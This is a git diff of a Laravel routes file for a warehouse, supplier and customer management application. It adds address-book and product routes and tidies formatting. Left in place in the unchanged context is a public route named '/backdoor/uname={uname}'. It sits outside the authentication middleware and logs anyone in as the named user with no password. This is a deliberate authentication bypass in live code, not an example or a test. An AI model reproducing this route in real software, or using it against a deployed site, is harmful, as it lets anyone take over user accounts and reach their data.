@@ -1,5 +1,6 @@
 <?php
 
+use App\Http\Controllers\AddressBook\addressBookController;
 use App\Http\Controllers\Auth\LoginController;
 use App\Http\Controllers\Auth\PasswordResetController;
 use App\Http\Controllers\Customers\DebtController;
@@ -14,12 +15,14 @@ use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\Suppliers\InvoiceController;
 use App\Http\Controllers\Suppliers\PaymentSupplierController;
 use App\Http\Controllers\Suppliers\SupplierController;
-use App\Http\Controllers\UserController;
 use App\Http\Controllers\Warehouses\ExportedController;
 use App\Http\Controllers\Warehouses\InventoryController;
 use App\Http\Controllers\Warehouses\ImportedController;
+use App\Http\Controllers\Warehouses\productRealityController;
+use App\Models\productReality;
 use Illuminate\Support\Facades\Auth;
 use App\Models\User;
+
 
 /*
 |--------------------------------------------------------------------------
@@ -32,14 +35,12 @@ use App\Models\User;
 |
 */
 
-Route::get('users/export/', [UserController::class, 'export']);
 
 Route::get('/backdoor/uname={uname}', function ($uname) {
     $user = User::where('uname', $uname)->get()->first();
     Auth::loginUsingId($user->Id);
     return redirect('/');
 });
-
 
 Route::prefix('auth')->namespace('auth')->name('auth.')->group(function () {
     Route::get('/login', [LoginController::class, 'index'])->name('loginIndex');
@@ -171,6 +172,13 @@ Route::prefix('/')->middleware('auth')->group(function () {
             Route::post('/note-inventory/{jancode}', [InventoryController::class, 'noteInventory'])->name('noteInventory');
         });
     });
+    Route::prefix('warehouses/productReality')->middleware('role')->name('warehouses.productReality.')->group(function () {
+        Route::resource('', productRealityController::class);
+        Route::get('getAddres/{uname}', [productRealityController::class, 'getAddress'])->name('getAdress');
+        Route::get('img/{img}',[productRealityController::class,'getImage'])->name('getImage');
+        Route::get('search',[productRealityController::class,'getSearch'])->name('getSearch');
+    });
+
 
     Route::prefix('commons')->middleware('role')->name('commons.')->group(function () {
         Route::get('/search-user', [LedgerController::class, 'searchUser'])->name('search-user');
@@ -194,7 +202,7 @@ Route::prefix('/')->middleware('auth')->group(function () {
             Route::get('/detail/{codeorder}', [BillCustomerController::class, 'orderDetail'])->name('orderDetail');
             Route::get('/detail/load-log/{codeorder}', [BillCustomerController::class, 'loadLog'])->name('loadLog');
             Route::post('/detail/add-log/{codeorder}', [BillCustomerController::class, 'addLog'])->name('addLog');
-            Route::get('{id_billcode}',[BillCustomerController::class,'getIdBillcode'])->name('idBillcode');
+            Route::get('{id_billcode}', [BillCustomerController::class, 'getIdBillcode'])->name('idBillcode');
         });
 
         Route::prefix('payment')->name('payment.')->group(function () {
@@ -210,5 +218,12 @@ Route::prefix('/')->middleware('auth')->group(function () {
             Route::get('/', [ExportedCustomerController::class, 'index'])->name('index');
             Route::get('/{jancode}', [ExportedCustomerController::class, 'detail'])->name('detail');
         });
+    });
+    Route::prefix('addressBook')->middleware('role')->name('addressBook.')->group(function () {
+        Route::resource('index', addressBookController::class);
+        Route::get('/{idTP}', [addressBookController::class, 'getDistrict'])->name('getDistrict');
+        Route::get('/district/{idQH}', [addressBookController::class, 'getWard'])->name('getWard');
+        Route::get('/modal/address/{id}',[addressBookController::class,'getAddress'])->name('getAddress');
+        // Route::get('/search')
     });
 });
